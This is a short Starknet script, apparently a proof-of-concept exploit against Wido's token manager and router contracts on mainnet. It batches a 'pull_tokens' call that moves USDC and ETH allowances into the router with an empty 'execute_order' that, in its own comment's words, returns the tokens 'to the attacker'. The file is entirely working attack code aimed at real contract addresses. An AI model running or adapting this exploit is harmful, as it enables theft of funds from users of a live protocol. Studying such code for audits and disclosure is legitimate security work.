import { network } from "hardhat";
import { stark } from "starknet";
import { STARKGATE_ETH, STARKNET_USDC } from "../test/address";
import { getOZAccountStarknetJS } from "../test/util";

async function main() {
    const network = "mainnet-alpha";
    const user = await getOZAccountStarknetJS("deployer", network);
    // const user = await getOZAccountStarknetJS("deployer");

    const widoL1Router = "0x7244f625106ad12fe95e1dd5a4d52576a4bfa2c129d2785afabc57d71ad6b27";
    const widoTokenManager = "0x0551c97951288fbd4a0f2c7d7f16ef80b941b4cc33645736c7c749b428438606";
    const widoRouter = "0x53509b3ead4d93635af5f7bf477d115e635b910fd840821dda8d9c0c6e0e79c";

    // Pull funds from WidoTokenManager to WidoRouter
    const pullFunds = {
        contractAddress: widoTokenManager,
        entrypoint: "pull_tokens",
        calldata: [
            widoL1Router,
            "0x2",
            STARKNET_USDC,
            "0x1f63af",
            "0x0",
            STARKGATE_ETH,
            "0x44364c5bb0000",
            "0x0"
        ]
    };
    console.log(pullFunds);

    // Send executeOrder to WidoRouter and just return tokens to the attacker.
    const attack = {
        contractAddress: widoRouter,
        entrypoint: "execute_order",
        calldata: [
            "0x0",
            "0x2",
            STARKNET_USDC,
            "0x1f63a",
            "0x0",
            STARKGATE_ETH,
            "0x44364c5bb000",
            "0x0",
            user.address,
            "0x0",
            "0x0",
            user.address,
            "0x0",
            "0x0"
        ]
    };
    console.log(attack);

    console.log(await user.execute([pullFunds, attack]));
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
